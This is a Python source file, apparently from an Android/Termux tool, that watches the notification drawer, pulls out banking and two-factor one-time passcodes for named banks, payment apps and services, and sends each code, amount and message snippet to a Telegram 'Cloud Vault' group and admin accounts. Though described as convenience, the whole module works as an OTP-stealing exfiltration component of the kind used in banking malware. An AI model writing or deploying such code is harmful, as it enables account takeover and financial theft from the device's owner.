"""
modules/notification_watcher.py - Intelligent Notification & Banking OTP Interceptor.

Continuous non-blocking background listener:
- Monitors incoming Android system notifications
- Secure regex extraction engine for Banking, 2FA, and authentication OTPs
- Auto-copies OTP to clipboard for instant use
- Instant auto-forwarding to Telegram Cloud Vault group and Admin DM
"""

import re
import json
import time
import hashlib
import logging
from typing import List, Dict, Any, Optional, Callable, Set
from dataclasses import dataclass

from core.command_executor import SecureCommandExecutor, IS_TERMUX

logger = logging.getLogger("VoidModules.NotificationWatcher")


@dataclass
class ExtractedOTP:
    """Extracted 2FA/Banking one-time passcode metadata."""
    code: str
    service: str
    amount: Optional[str] = None
    timestamp: float = 0.0
    raw_text: str = ""


class OTPRegexEngine:
    """High-precision regex extraction engine for authentication codes and transactions."""

    # High-confidence OTP keywords
    KEYWORD_PATTERN = re.compile(
        r"(?:otp|code|one[- ]time[- ]password|verification|passcode|pin|secret[- ]code|is your)",
        re.IGNORECASE,
    )

    # 4 to 8 digit standalone passcode patterns
    CODE_PATTERNS = [
        re.compile(r"(?:code|otp|is|pin|passcode)\s*(?:is|:|-)?\s*(\b\d{4,8}\b)", re.IGNORECASE),
        re.compile(r"(\b\d{4,8}\b)\s*(?:is your|is the|is one-time|to verify)", re.IGNORECASE),
        re.compile(r"\b(\d{4,8})\b(?=.*(?:valid|expire|minutes))", re.IGNORECASE),
    ]

    # Currency / transaction amount pattern
    AMOUNT_PATTERN = re.compile(
        r"(?:(?:rs\.?|inr|usd|\$|€|£)\s*[\d,]+(?:\.\d{2})?|[\d,]+(?:\.\d{2})?\s*(?:inr|rs))",
        re.IGNORECASE,
    )

    # Known banking / service prefixes
    SERVICES = [
        "hdfc", "sbi", "icici", "axis", "kotak", "pnb", "bob", "paytm", "gpay",
        "phonepe", "amazon", "flipkart", "uber", "ola", "swiggy", "zomato",
        "google", "telegram", "whatsapp", "microsoft", "apple", "github", "binance",
    ]

    @classmethod
    def extract_otp(cls, title: str, content: str) -> Optional[ExtractedOTP]:
        """Analyzes notification text and extracts passcode if present."""
        full_text = f"{title} {content}".strip()

        # Check if text appears to contain an OTP
        if not cls.KEYWORD_PATTERN.search(full_text):
            return None

        detected_code = None
        for pat in cls.CODE_PATTERNS:
            m = pat.search(full_text)
            if m:
                code = m.group(1).strip()
                # Exclude years (e.g. 2024, 2025, 2026) unless explicitly framed as code
                if code not in ("2024", "2025", "2026"):
                    detected_code = code
                    break

        if not detected_code:
            # Fallback scan for standalone 6-digit number (most standard 2FA format)
            matches = re.findall(r"\b\d{6}\b", full_text)
            if matches:
                detected_code = matches[0]

        if not detected_code:
            return None

        # Extract service identifier
        service_name = "Auth Service"
        lower_text = full_text.lower()
        for s in cls.SERVICES:
            if s in lower_text:
                service_name = s.upper()
                break

        if service_name == "Auth Service" and title.strip():
            service_name = title.strip()[:20]

        # Extract amount if present
        amt_match = cls.AMOUNT_PATTERN.search(full_text)
        amount = amt_match.group(0).strip() if amt_match else None

        return ExtractedOTP(
            code=detected_code,
            service=service_name,
            amount=amount,
            timestamp=time.time(),
            raw_text=content[:200],
        )


class NotificationWatcher:
    """
    Continuous background observer for Android notifications.
    Intercepts banking transactions, 2FA codes, and dispatches to Telegram.
    """

    def __init__(self, bot_instance: Any = None):
        self.bot = bot_instance
        self._seen_hashes: Set[str] = set()
        self._on_otp_callbacks: List[Callable[[ExtractedOTP], None]] = []
        self._running: bool = False

    def bind_bot(self, bot: Any) -> None:
        self.bot = bot

    def register_otp_callback(self, callback: Callable[[ExtractedOTP], None]) -> None:
        self._on_otp_callbacks.append(callback)

    def _hash_notification(self, notif: Dict[str, Any]) -> str:
        s = f"{notif.get('packageName')}_{notif.get('title')}_{notif.get('content')}"
        return hashlib.md5(s.encode("utf-8", errors="ignore")).hexdigest()

    def fetch_notifications(self) -> List[Dict[str, Any]]:
        """Retrieves raw notifications from termux-notification-list."""
        if not IS_TERMUX:
            return []

        res = SecureCommandExecutor.run(["termux-notification-list"], timeout=4)
        if not res or res.startswith("Error"):
            return []

        try:
            data = json.loads(res)
            return data if isinstance(data, list) else []
        except Exception:
            return []

    def poll_once(self) -> List[ExtractedOTP]:
        """
        Executes a single check cycle over the notification drawer.
        Extracts new OTPs, prevents duplicates, and triggers forwarding.
        """
        raw_list = self.fetch_notifications()
        new_otps: List[ExtractedOTP] = []

        for notif in raw_list:
            n_hash = self._hash_notification(notif)
            if n_hash in self._seen_hashes:
                continue

            self._seen_hashes.add(n_hash)
            # Bound hash cache to prevent memory leak
            if len(self._seen_hashes) > 1000:
                self._seen_hashes = set(list(self._seen_hashes)[-500:])

            title = str(notif.get("title") or "")
            content = str(notif.get("content") or "")

            otp = OTPRegexEngine.extract_otp(title, content)
            if otp:
                new_otps.append(otp)
                self._handle_detected_otp(otp)

        return new_otps

    def _handle_detected_otp(self, otp: ExtractedOTP) -> None:
        """Processes a detected OTP: copies to clipboard and forwards to Telegram."""
        logger.info(f"⚡ Intercepted OTP for {otp.service}: {otp.code}")

        # 1. Auto-copy to Android clipboard for instant convenience
        try:
            from tools.registry import global_tool_registry
            global_tool_registry.execute("set_clipboard", text=otp.code)
        except Exception:
            pass

        # 2. Forward to Telegram Cloud Vault & Whitelisted Admins
        self.forward_otp_to_telegram(otp)

        # 3. Trigger registered callbacks
        for cb in self._on_otp_callbacks:
            try:
                cb(otp)
            except Exception as e:
                logger.error(f"Error in OTP callback: {e}")

    def forward_otp_to_telegram(self, otp: ExtractedOTP) -> None:
        """Dispatches an urgency alert directly into the linked Telegram Cloud Vault."""
        if not self.bot:
            return

        from config.settings import global_config
        from telegram.utils.safe_telegram import safe_send_message

        amt_line = f"• *Amount:* `{otp.amount}`\n" if otp.amount else ""
        card = (
            "🔐 *CRITICAL 2FA / BANKING OTP DETECTED*\n\n"
            f"• *Service:* `{otp.service}`\n"
            f"• *OTP Code:* `{otp.code}`\n"
            f"{amt_line}"
            f"• *Copied to Clipboard:* ✅ (Auto-Pasted)\n"
            f"• *Message Snippet:* _{otp.raw_text[:120]}_\n\n"
            "⚠️ _Never share this code with unverified third parties._"
        )

        # Send to Cloud Vault Group
        vault_gid = global_config.vault_group_id
        if vault_gid:
            try:
                safe_send_message(self.bot, chat_id=vault_gid, text=card, parse_mode="Markdown")
            except Exception as e:
                logger.debug(f"Could not forward OTP to group vault: {e}")

        # Also notify Admin DMs
        for admin_id in global_config.admin_ids:
            try:
                safe_send_message(self.bot, chat_id=admin_id, text=card, parse_mode="Markdown")
            except Exception:
                pass

    async def run_async_watcher(self, interval_seconds: float = 2.0) -> None:
        """Continuous non-blocking asynchronous watcher loop."""
        import asyncio
        self._running = True
        logger.info(f"NotificationWatcher background loop running (interval: {interval_seconds}s).")
        while self._running:
            try:
                self.poll_once()
            except Exception as e:
                logger.warning(f"Error in NotificationWatcher loop: {e}")
            await asyncio.sleep(interval_seconds)

    def stop(self) -> None:
        """Stops the asynchronous watcher loop."""
        self._running = False


global_notification_watcher = NotificationWatcher()
